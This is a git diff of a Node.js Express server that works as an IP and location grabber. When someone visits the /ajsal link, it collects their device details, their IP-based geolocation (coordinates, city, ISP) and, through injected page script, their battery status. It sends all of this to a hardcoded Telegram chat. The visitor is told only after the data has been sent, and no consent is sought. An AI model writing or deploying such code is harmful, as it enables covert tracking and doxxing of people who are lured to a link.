@@ -13,7 +13,6 @@ const ajsal = '6524787237';
 
 // Create an express app
 const app = express();
-app.use(express.json());
 
 // Helper Functions
 function getDeviceName(userAgent) {
@@ -41,6 +40,7 @@ function getBrowserVersion(userAgent) {
   return match ? match[1] : "unknown";
 }
 
+// Function to fetch user data from ipapi.co
 async function fetchUserData(ip) {
   try {
     const response = await axios.get(`https://ipapi.co/${ip}/json/`);
@@ -51,7 +51,7 @@ async function fetchUserData(ip) {
   }
 }
 
-// Route `/ajsal`
+// Combined Route `/ajsal`
 app.get('/ajsal', async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -64,18 +64,38 @@ app.get('/ajsal', async (req, res) => {
   // Fetch user location data
   const userData = await fetchUserData(userIp);
 
-  // HTML response
+  // Combine all information into one message
+  const message = `
+🌐 *Device Info*:
+- Device: ${deviceName}
+- OS Version: ${osVersion}
+- Browser: ${browserVersion}
+
+📍 *Location Info*:
+- **IP Address**: ${userData?.ip || "Unknown"}
+- **City**: ${userData?.city || "Unknown"}
+- **Region**: ${userData?.region || "Unknown"}
+- **Country**: ${userData?.country_name || "Unknown"}
+- **Latitude**: ${userData?.latitude || "Unknown"}
+- **Longitude**: ${userData?.longitude || "Unknown"}
+- **ISP**: ${userData?.org || "Unknown"}
+`;
+
+  // Send the information to Telegram
+  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+
+  // Respond with an HTML page
   const html = `
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Device, Location & Battery Info</title>
+      <title>Device & Location Info</title>
     </head>
     <body>
-      <h1>Sending Your Info</h1>
-      <p>Your device, location, and battery info will be sent shortly.</p>
+      <h1>Device & Location Info Sent!</h1>
+      <p>Your device and location information have been sent to Telegram.</p>
       <script>
         async function sendBatteryInfo() {
           try {
@@ -84,9 +104,9 @@ app.get('/ajsal', async (req, res) => {
               level: (battery.level * 100) + '%',
               charging: battery.charging ? 'Charging' : 'Not Charging'
             };
-
+            
             // Send battery info to the server
-            fetch('/send-info', {
+            fetch('/battery', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(batteryInfo)
@@ -103,45 +123,21 @@ app.get('/ajsal', async (req, res) => {
   `;
 
   res.send(html);
-
-  // Save device and location info for later use
-  req.deviceInfo = { deviceName, osVersion, browserVersion };
-  req.userData = userData;
 });
 
-// Handle battery and combined data
-app.post('/send-info', async (req, res) => {
+// Handle battery info sent from the client
+app.post('/battery', express.json(), (req, res) => {
   const { level, charging } = req.body;
+  const nmessage = `👨🏻‍💻 Navgitor.UserAgent Info 
+ 
+ 🔋 *Battery Info*:
+- Level: ${level}
+- Status: ${charging}`;
 
-  // Retrieve stored device and location info
-  const deviceInfo = req.deviceInfo || {};
-  const userData = req.userData || {};
-
-  // Combine all info
-  const message = `
-🌐 *Device Info*:
-- Device: ${deviceInfo.deviceName || 'Unknown'}
-- OS Version: ${deviceInfo.osVersion || 'Unknown'}
-- Browser: ${deviceInfo.browserVersion || 'Unknown'}
-
-📍 *Location Info*:
-- IP Address: ${userData.ip || 'Unknown'}
-- City: ${userData.city || 'Unknown'}
-- Region: ${userData.region || 'Unknown'}
-- Country: ${userData.country_name || 'Unknown'}
-- Latitude: ${userData.latitude || 'Unknown'}
-- Longitude: ${userData.longitude || 'Unknown'}
-- ISP: ${userData.org || 'Unknown'}
-
-🔋 *Battery Info*:
-- Level: ${level || 'Unknown'}
-- Status: ${charging || 'Unknown'}
-`;
-
-  // Send the information to Telegram
-  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
-
-  res.status(200).send('Info sent to Telegram.');
+  // Send battery info to your Telegram
+  bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
+  
+  res.status(200).send('Battery info sent to Telegram.');
 });
 
 // Start the server
